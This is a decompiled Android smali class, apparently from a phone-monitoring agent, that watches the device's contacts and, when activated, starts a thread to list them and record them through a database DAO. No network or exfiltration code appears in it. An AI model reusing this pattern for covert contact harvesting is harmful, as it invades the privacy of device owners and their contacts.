.class public Lcom/hp/vd/module/monitor/contact/ContactObserver;
.super Lcom/hp/vd/module/ActivatableContentObserverAbstract;
.source "ContactObserver.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "ContactObserver"


# instance fields
.field protected contactDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/module/monitor/ContactMonitor;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 32
    new-instance v0, Lcom/hp/vd/module/monitor/contact/HandlerConstruct;

    invoke-direct {v0}, Lcom/hp/vd/module/monitor/contact/HandlerConstruct;-><init>()V

    invoke-direct {p0, v0}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;-><init>(Landroid/os/Handler;)V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->context:Lcom/hp/vd/context/Context;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 34
    iput-object p1, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    .line 35
    iput-object p2, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->context:Lcom/hp/vd/context/Context;

    .line 36
    iput-object p3, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 37
    iput-object p4, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactDao:Lcom/j256/ormlite/dao/Dao;

    .line 38
    iput-object p5, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 7

    .line 43
    invoke-super {p0, p1}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;->onChange(Z)V

    .line 45
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/contact/ContactObserver;->isActivated()Z

    move-result p1

    if-nez p1, :cond_0

    return-void

    .line 49
    :cond_0
    new-instance p1, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactMonitor:Lcom/hp/vd/module/monitor/ContactMonitor;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->contactDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/contact/ContactObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v0, p1

    move-object v1, p0

    invoke-direct/range {v0 .. v6}, Lcom/hp/vd/module/monitor/contact/ContactObserver$ThreadLister;-><init>(Lcom/hp/vd/module/monitor/contact/ContactObserver;Lcom/hp/vd/module/monitor/ContactMonitor;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 57
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method
